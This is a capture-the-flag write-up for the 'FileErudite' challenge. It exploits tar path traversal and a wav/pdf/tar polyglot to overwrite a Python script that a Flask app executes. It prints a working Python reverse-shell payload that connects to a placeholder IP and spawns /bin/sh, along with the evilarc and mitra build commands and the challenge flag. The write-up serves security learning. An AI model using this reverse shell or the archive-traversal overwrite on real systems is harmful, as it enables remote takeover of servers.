# FileErudite
——————— 𝘼𝙪𝙩𝙝𝙤𝙧 𝙣𝙤𝙩𝙚 ———————<br>
𝗖𝗵𝗮𝗹𝗹𝗲𝗻𝗴𝗲’𝘀 𝗻𝗮𝗺𝗲: FileErudite.<br>
𝗖𝗮𝘁𝗲𝗴𝗼𝗿𝘆: Web/Misc.<br>
𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻: Who said files are simple? In the right<br>
circumstances they can be very complex and surprisingly<br>
weird. Here at FileErudite we discover the weirdness<br>
of files. If you want to take the journey come and join us<br>
but first, you have to prove you have what it takes!<br>
Here starts the adventure: https://gofile.io/d/jywV3Y<br>
——————————————————————— <br>
![alt challenge](./fileerudite.png)

This flask application takes a file and checks if it's a valid wave, pdf and tar file if it passes that check it will extract it<br>
to the './extracted/' directory, then it will execute a python script located at the parent directory '../join_us.py' <br>
```python
def check(file):
    if valid_tar(file) and valid_wave(file) and valid_pdf(file):
        try:
            with tarfile.open(file) as tar:
                os.system(f'rm -rf{EXTRACT_FOLDER}/*')
                tar.extractall(EXTRACT_FOLDER)
        except:
            return False

        os.system('python3 ../join_us.py ')
        os.system(f'rm -rf {EXTRACT_FOLDER}/*')
        isvalid = True
    else:
        isvalid = False

    os.system(f"rm {file}")
    return isvalid
```
We can't abuse the uploaded filename because it's randomized, so we need to pass that check and overwrite '../join_us.py'<br>
We can create a tar file that contains a reverse-shell python script with the filename '../../join_us.py' using [evilarc](https://github.com/ptoomey3/evilarc)<br>
then taring it so it will get extracted to './extracted/../../join_us.py' overwriting the existing file, then we need to make a binary polyglot file using [mitra](https://github.com/corkami/mitra) that is a valid wav, pdf and tar file<br>(ps: the order of the arguments matter for mitra)
```python
import sys,socket,os,pty

s=socket.socket()
s.connect(("ip_address",port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
```
```
python2 evilarc.py join_us.py --out file.tar
./mitra.py file.wav file.pdf -o ./
./mitra.py [generated_file.waw.pdf] file.tar -o ./
```
## Flag
```
shellmates{0ne_fIl3_T0_RuLe_T|-|em_4ll}

